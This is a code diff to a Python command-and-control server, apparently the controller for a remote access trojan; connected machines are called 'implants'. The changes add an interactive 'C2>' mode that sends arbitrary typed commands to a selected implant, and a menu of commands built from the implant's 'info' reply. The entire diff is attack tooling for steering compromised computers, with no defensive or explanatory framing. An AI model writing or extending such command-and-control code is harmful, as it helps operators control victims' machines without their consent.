@@ -71,6 +71,7 @@ class C2Server:
             return
         try:
             client.send(command.encode())
+            time.sleep(0.01)
             response = client.recv(4096).decode()
             return response
         except Exception as e:
@@ -96,6 +97,17 @@ if __name__ == "__main__":
         time.sleep(0.01)
         input("\nPress enter to continue...")
         os.system("clear")
+        
+    def interactive():
+        run = True
+        runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
+        while run:
+            command = str_input('C2> ')
+            if command == "return":
+                    run = False
+            else:
+                server.send_command(command)
+        runstatus.success()
 
     ratrace = True
     while ratrace:
@@ -121,7 +133,7 @@ if __name__ == "__main__":
                     log.info(format)
             else:
                 log.info("No clients connected")
-        elif choice == 2:
+        elif choice == 2:	# Connect to a Client
                 if len(server.clients) > 0:
                     targets = []
                     for client in server.clients:
@@ -130,19 +142,26 @@ if __name__ == "__main__":
                         targets.append(format)
                     target = options('Select a client:', targets)
                     server.select_client(target)
+                    implant = server.send_command("info").split(' ')
+                    implant.append("interactive")
+                    implant.append("return")
                     run = True
-                    implant = server.send_command("info")
-                    runstatus = log.waitfor(f"Connected to {implant.split(' ')[0]} on {targets[target]} | enter 'return' to quit | STATUS = ", status = "Commanding")
                     while run:
-                        command = str_input('C2> ')
-                        if command == "return":
-                            run = False
+                        c2choice = (options(f'Connected to {implant[0]} on {targets[target]}', implant[1:]) + 1)
+                        if implant[c2choice] != "return":
+                            if implant[c2choice] == "interactive":
+                                interactive()
+                            else:
+                                server.send_command(implant[c2choice])
+                            resetgui()
                         else:
-                            server.send_command(command)
-                    runstatus.success()
+                            log.info("Returning...\n")
+                            run = False
+                                                
                 else:
                     log.info("No clients connected")
         else:
+            C2Server.stop()
             os.system("clear")
             ratrace = False
             splash()
